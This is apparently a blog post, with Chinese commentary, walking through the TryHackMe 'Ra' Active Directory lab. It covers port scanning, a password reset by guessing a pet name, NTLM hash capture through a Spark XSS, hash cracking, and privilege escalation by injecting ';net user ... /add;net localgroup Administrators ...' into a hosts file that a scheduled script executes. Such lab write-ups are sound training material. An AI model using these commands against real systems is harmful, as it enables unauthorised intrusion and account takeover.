@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before all這台…好難qwq燒了快六小時   Victim’s IP : 10.10.31.87Victim’s Host : windcorp.thmAttacker’s IP : 10.9.195.189   Write UpRECONport scancommand   1rustscan -a 10.10.31.87 --ulimit 5000 -- -sC -sV -PN res">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ra Write Up on TryHackMe">
+<meta property="og:url" content="http://wha13.github.io/2024/07/28/ra/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before all這台…好難qwq燒了快六小時   Victim’s IP : 10.10.31.87Victim’s Host : windcorp.thmAttacker’s IP : 10.9.195.189   Write UpRECONport scancommand   1rustscan -a 10.10.31.87 --ulimit 5000 -- -sC -sV -PN res">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkE0li7YR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H16SGimFA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1XCfj7tR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1vbXoQtR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1hVmsQK0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJZ9XjmFR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByUDH27FA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryagL3mFC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJlRL3mY0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BydbP3mYA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJi2v2QFA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1m022XFR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1mBanmKC.png">
+<meta property="article:published_time" content="2024-07-28T21:08:08.000Z">
+<meta property="article:modified_time" content="2024-07-28T12:47:04.132Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="Pentesting">
+<meta property="article:tag" content="AD">
+<meta property="article:tag" content="Active Directory">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="TryHackMe">
+<meta property="article:tag" content="Account Operators">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/BkE0li7YR.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Ra Write Up on TryHackMe</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/08/08/latex-vuln/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/07/26/thm-yoto/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/07/28/ra/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/07/28/ra/&text=Ra Write Up on TryHackMe"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/07/28/ra/&title=Ra Write Up on TryHackMe"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/07/28/ra/&is_video=false&description=Ra Write Up on TryHackMe"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Ra Write Up on TryHackMe&body=Check out this article: http://wha13.github.io/2024/07/28/ra/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/07/28/ra/&title=Ra Write Up on TryHackMe"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/07/28/ra/&title=Ra Write Up on TryHackMe"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/07/28/ra/&title=Ra Write Up on TryHackMe"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/07/28/ra/&title=Ra Write Up on TryHackMe"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/07/28/ra/&name=Ra Write Up on TryHackMe&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/07/28/ra/&t=Ra Write Up on TryHackMe"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write Up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RECON"><span class="toc-number">3.</span> <span class="toc-text">RECON</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#port-scan"><span class="toc-number">3.1.</span> <span class="toc-text">port scan</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">4.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#password-reset-through-information-gathering"><span class="toc-number">4.1.</span> <span class="toc-text">password reset through information gathering</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phshing-through-openfire-Spark-XSS"><span class="toc-number">4.2.</span> <span class="toc-text">Phshing through openfire Spark XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">5.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-Account-Operato"><span class="toc-number">5.1.</span> <span class="toc-text">Abusing Account Operato</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">6.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Ra Write Up on TryHackMe
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-07-28T21:08:08.000Z" class="dt-published" itemprop="datePublished">2024-07-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/AD/" rel="tag">AD</a>, <a class="p-category" href="/tags/Account-Operators/" rel="tag">Account Operators</a>, <a class="p-category" href="/tags/Active-Directory/" rel="tag">Active Directory</a>, <a class="p-category" href="/tags/Pentesting/" rel="tag">Pentesting</a>, <a class="p-category" href="/tags/TryHackMe/" rel="tag">TryHackMe</a>, <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>這台…好難qwq<br>燒了快六小時  </p>
+<p>Victim’s IP : 10.10.31.87<br>Victim’s Host : windcorp.thm<br>Attacker’s IP : 10.9.195.189  </p>
+<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h2 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h2><h3 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h3><p><strong>command</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rustscan -a 10.10.31.87 --ulimit 5000 -- -sC -sV -PN</span><br></pre></td></tr></table></figure>
+<p><strong>result</strong><br><img src="https://hackmd.io/_uploads/BkE0li7YR.png" alt="image">  </p>
+<p>發現開啟了 DNS SERVER, Kerberos, smb, ldap, web service(port 80&amp;9090), jabber&#x2F;openfire支援的一些東西, winrm和rpc呼叫。  </p>
+<p><img src="https://hackmd.io/_uploads/H16SGimFA.png" alt="image">  </p>
+<p>也獲得域名 fire.windcorp.thm 以及 windcorp.thm</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="password-reset-through-information-gathering"><a href="#password-reset-through-information-gathering" class="headerlink" title="password reset through information gathering"></a>password reset through information gathering</h3><p><img src="https://hackmd.io/_uploads/H1XCfj7tR.png" alt="image">  </p>
+<p>進入網站後發現password reset按鈕，點擊後會進到 <code>http://fire.windcorp.thm/reset.asp</code><br><img src="https://hackmd.io/_uploads/H1vbXoQtR.png" alt="image">  </p>
+<p>重新觀察主頁，注意到合照：<br><img src="https://hackmd.io/_uploads/H1hVmsQK0.png" alt="image">  </p>
+<p>url為<code>http://10.10.31.87/img/lilyleAndSparky.jpg</code><br>猜測寵物名稱為 Sparky<br>輸入Reset Password表單後獲得密碼<code>ChangeMe#1234</code><br><img src="https://hackmd.io/_uploads/rJZ9XjmFR.png" alt="image">  </p>
+<h3 id="Phshing-through-openfire-Spark-XSS"><a href="#Phshing-through-openfire-Spark-XSS" class="headerlink" title="Phshing through openfire Spark XSS"></a>Phshing through openfire Spark XSS</h3><p><em>這部分我還沒找到 reference qwq，有好心人看到請戳我一下</em><br><em>不過真的有看到一陀XSS XD</em><br>從 <a target="_blank" rel="noopener" href="https://www.igniterealtime.org/downloads/">(download link)</a> 取得 spark<br>寄給主頁身分是綠色ㄉBuse<br><strong>payload</strong><br><img src="https://hackmd.io/_uploads/ByUDH27FA.png" alt="image">  </p>
+<p>開啟 responder  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0</span><br></pre></td></tr></table></figure>
+<p>成功接到NTLM HASH (Windows再開啟HTML TAG上的URL時會用NTLM2進行驗證)<br><img src="https://hackmd.io/_uploads/ryagL3mFC.png" alt="image">  </p>
+<p>利用john進行密碼爆破<br><img src="https://hackmd.io/_uploads/BJlRL3mY0.png" alt="image"></p>
+<p>成功取得buse的帳號密碼  </p>
+<p>利用 evil-winrm 登入成功  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -u buse -p uzunLM+3131 -i 10.10.31.87</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/BydbP3mYA.png" alt="image">  </p>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Abusing-Account-Operato"><a href="#Abusing-Account-Operato" class="headerlink" title="Abusing Account Operato"></a>Abusing Account Operato</h3><blockquote>
+<p>觀察 1<br>利用 <code>whoami</code> 系列指令作權限檢查，其中 group 包含 Account Operator<br><img src="https://hackmd.io/_uploads/rJi2v2QFA.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>觀察 2<br><strong>C:\scripts\checkservers.ps1</strong></p>
+</blockquote>
+<figure class="highlight ps"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># reset the lists of hosts prior to looping</span></span><br><span class="line"><span class="variable">$OutageHosts</span> = <span class="variable">$Null</span></span><br><span class="line"><span class="comment"># specify the time you want email notifications resent for hosts that are down</span></span><br><span class="line"><span class="variable">$EmailTimeOut</span> = <span class="number">30</span></span><br><span class="line"><span class="comment"># specify the time you want to cycle through your host lists.</span></span><br><span class="line"><span class="variable">$SleepTimeOut</span> = <span class="number">45</span></span><br><span class="line"><span class="comment"># specify the maximum hosts that can be down before the script is aborted</span></span><br><span class="line"><span class="variable">$MaxOutageCount</span> = <span class="number">10</span></span><br><span class="line"><span class="comment"># specify who gets notified</span></span><br><span class="line"><span class="variable">$notificationto</span> = <span class="string">&quot;brittanycr@windcorp.thm&quot;</span></span><br><span class="line"><span class="comment"># specify where the notifications come from</span></span><br><span class="line"><span class="variable">$notificationfrom</span> = <span class="string">&quot;admin@windcorp.thm&quot;</span></span><br><span class="line"><span class="comment"># specify the SMTP server</span></span><br><span class="line"><span class="variable">$smtpserver</span> = <span class="string">&quot;relay.windcorp.thm&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># start looping here</span></span><br><span class="line"><span class="keyword">Do</span>&#123;</span><br><span class="line"><span class="variable">$available</span> = <span class="variable">$Null</span></span><br><span class="line"><span class="variable">$notavailable</span> = <span class="variable">$Null</span></span><br><span class="line"><span class="built_in">Write-Host</span> (<span class="built_in">Get-Date</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read the File with the Hosts every cycle, this way to can add/remove hosts</span></span><br><span class="line"><span class="comment"># from the list without touching the script/scheduled task,</span></span><br><span class="line"><span class="comment"># also hash/comment (#) out any hosts that are going for maintenance or are down.</span></span><br><span class="line"><span class="built_in">get-content</span> C:\Users\brittanycr\hosts.txt | <span class="built_in">Where-Object</span> &#123;!(<span class="variable">$_</span> <span class="operator">-match</span> <span class="string">&quot;#&quot;</span>)&#125; |</span><br><span class="line"><span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&quot;Test-Connection -ComputerName <span class="variable">$_</span> -Count 1 -ea silentlycontinue&quot;</span></span><br><span class="line">    <span class="built_in">Invoke-Expression</span> <span class="variable">$p</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$p</span>)</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="comment"># if the Host is available then just write it to the screen</span></span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Available host ---&gt; &quot;</span><span class="variable">$_</span> <span class="literal">-BackgroundColor</span> Green <span class="literal">-ForegroundColor</span> White</span><br><span class="line">     [<span class="built_in">Array</span>]<span class="variable">$available</span> += <span class="variable">$_</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">     <span class="comment"># If the host is unavailable, give a warning to screen</span></span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Unavailable host ------------&gt; &quot;</span><span class="variable">$_</span> <span class="literal">-BackgroundColor</span> Magenta <span class="literal">-ForegroundColor</span> White</span><br><span class="line">     <span class="variable">$p</span> = <span class="built_in">Test-Connection</span> <span class="literal">-ComputerName</span> <span class="variable">$_</span> <span class="literal">-Count</span> <span class="number">1</span> <span class="literal">-ea</span> silentlycontinue</span><br><span class="line">     <span class="keyword">if</span>(!(<span class="variable">$p</span>))</span><br><span class="line">       &#123;</span><br><span class="line">        <span class="comment"># If the host is still unavailable for 4 full pings, write error and send email</span></span><br><span class="line">        <span class="built_in">write-host</span> <span class="string">&quot;Unavailable host ------------&gt; &quot;</span><span class="variable">$_</span> <span class="literal">-BackgroundColor</span> Red <span class="literal">-ForegroundColor</span> White</span><br><span class="line">        [<span class="built_in">Array</span>]<span class="variable">$notavailable</span> += <span class="variable">$_</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$OutageHosts</span> <span class="operator">-ne</span> <span class="variable">$Null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$OutageHosts</span>.ContainsKey(<span class="variable">$_</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                 <span class="comment"># First time down add to the list and send email</span></span><br><span class="line">                 <span class="built_in">Write-Host</span> <span class="string">&quot;<span class="variable">$_</span> Is not in the OutageHosts list, first time down&quot;</span></span><br><span class="line">                 <span class="variable">$OutageHosts</span>.Add(<span class="variable">$_</span>,(<span class="built_in">get-date</span>))</span><br><span class="line">                 <span class="variable">$Now</span> = <span class="built_in">Get-date</span></span><br><span class="line">                 <span class="variable">$Body</span> = <span class="string">&quot;<span class="variable">$_</span> has not responded for 5 pings at <span class="variable">$Now</span>&quot;</span></span><br><span class="line">                 <span class="built_in">Send-MailMessage</span> <span class="literal">-Body</span> <span class="string">&quot;<span class="variable">$body</span>&quot;</span> <span class="literal">-to</span> <span class="variable">$notificationto</span> <span class="literal">-from</span> <span class="variable">$notificationfrom</span> `</span><br><span class="line">                  <span class="literal">-Subject</span> <span class="string">&quot;Host <span class="variable">$_</span> is down&quot;</span> <span class="literal">-SmtpServer</span> <span class="variable">$smtpserver</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment"># If the host is in the list do nothing for 1 hour and then remove from the list.</span></span><br><span class="line">                    <span class="built_in">Write-Host</span> <span class="string">&quot;<span class="variable">$_</span> Is in the OutageHosts list&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> (((<span class="built_in">Get-Date</span>) - <span class="variable">$OutageHosts</span>.Item(<span class="variable">$_</span>)).TotalMinutes <span class="operator">-gt</span> <span class="variable">$EmailTimeOut</span>)</span><br><span class="line">                    &#123;<span class="variable">$OutageHosts</span>.Remove(<span class="variable">$_</span>)&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment"># First time down create the list and send email</span></span><br><span class="line">                <span class="built_in">Write-Host</span> <span class="string">&quot;Adding <span class="variable">$_</span> to OutageHosts.&quot;</span></span><br><span class="line">                <span class="variable">$OutageHosts</span> = <span class="selector-tag">@</span>&#123;<span class="variable">$_</span>=(<span class="built_in">get-date</span>)&#125;</span><br><span class="line">                <span class="variable">$Body</span> = <span class="string">&quot;<span class="variable">$_</span> has not responded for 5 pings at <span class="variable">$Now</span>&quot;</span></span><br><span class="line">                <span class="built_in">Send-MailMessage</span> <span class="literal">-Body</span> <span class="string">&quot;<span class="variable">$body</span>&quot;</span> <span class="literal">-to</span> <span class="variable">$notificationto</span> <span class="literal">-from</span> <span class="variable">$notificationfrom</span> `</span><br><span class="line">                 <span class="literal">-Subject</span> <span class="string">&quot;Host <span class="variable">$_</span> is down&quot;</span> <span class="literal">-SmtpServer</span> <span class="variable">$smtpserver</span></span><br><span class="line">            &#125;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># Report to screen the details</span></span><br><span class="line"><span class="variable">$log</span> = <span class="string">&quot;Last run: <span class="variable">$</span>(Get-Date)&quot;</span></span><br><span class="line"><span class="built_in">write-host</span> <span class="variable">$log</span></span><br><span class="line"><span class="built_in">Set-Content</span> <span class="literal">-Path</span> C:\scripts\log.txt <span class="literal">-Value</span> <span class="variable">$log</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;Available count:&quot;</span><span class="variable">$available</span>.count</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;Not available count:&quot;</span><span class="variable">$notavailable</span>.count</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;Not available hosts:&quot;</span></span><br><span class="line"><span class="variable">$OutageHosts</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;Sleeping <span class="variable">$SleepTimeOut</span> seconds&quot;</span></span><br><span class="line"><span class="built_in">sleep</span> <span class="variable">$SleepTimeOut</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$OutageHosts</span>.Count <span class="operator">-gt</span> <span class="variable">$MaxOutageCount</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment"># If there are more than a certain number of host down in an hour abort the script.</span></span><br><span class="line">    <span class="variable">$Exit</span> = <span class="variable">$True</span></span><br><span class="line">    <span class="variable">$body</span> = <span class="variable">$OutageHosts</span> | <span class="built_in">Out-String</span></span><br><span class="line">    <span class="built_in">Send-MailMessage</span> <span class="literal">-Body</span> <span class="string">&quot;<span class="variable">$body</span>&quot;</span> <span class="literal">-to</span> <span class="variable">$notificationto</span> <span class="literal">-from</span> <span class="variable">$notificationfrom</span> `</span><br><span class="line">     <span class="literal">-Subject</span> <span class="string">&quot;More than <span class="variable">$MaxOutageCount</span> Hosts down, monitoring aborted&quot;</span> <span class="literal">-SmtpServer</span> <span class="variable">$smtpServer</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$Exit</span> <span class="operator">-ne</span> <span class="variable">$True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>重點在這一段：  </p>
+<figure class="highlight ps"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get-content</span> C:\Users\brittanycr\hosts.txt | <span class="built_in">Where-Object</span> &#123;!(<span class="variable">$_</span> <span class="operator">-match</span> <span class="string">&quot;#&quot;</span>)&#125; |</span><br><span class="line"><span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&quot;Test-Connection -ComputerName <span class="variable">$_</span> -Count 1 -ea silentlycontinue&quot;</span></span><br><span class="line">    <span class="built_in">Invoke-Expression</span> <span class="variable">$p</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$p</span>)</span><br></pre></td></tr></table></figure>
+<p>會將C:\Users\brittanycr\hosts.txt裡面的所有內容切行以後塞進 For-Each 那邊的 $p 變數，並利用 <code>Invoke-Expression</code> 將它作為指令執行<br>結合它是每45秒跑一次，高機率是一個 cronjob，嘗試利用 Buse 的權限更改 brittanycr 的密碼：<br><strong>command</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user brittanycr whale120? /domain</span><br></pre></td></tr></table></figure>
+
+<p>以 smbclient 登入成功，利用put指令把本地的惡意hosts.txt丟上去：   </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;net user whale120 wh@le120 /add;net localgroup Administrators whale120 /add</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/r1m022XFR.png" alt="image">  </p>
+<p>等一下，用 evil-winrm 遠端登入並確認身分  </p>
+<p><img src="https://hackmd.io/_uploads/H1mBanmKC.png" alt="image"></p>
+<p>成功拿到 Administrators Group  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>Account Opertors權限利用的其他方式<br><a target="_blank" rel="noopener" href="https://secframe.com/guides/acct_ops_attacked/">https://secframe.com/guides/acct_ops_attacked&#x2F;</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
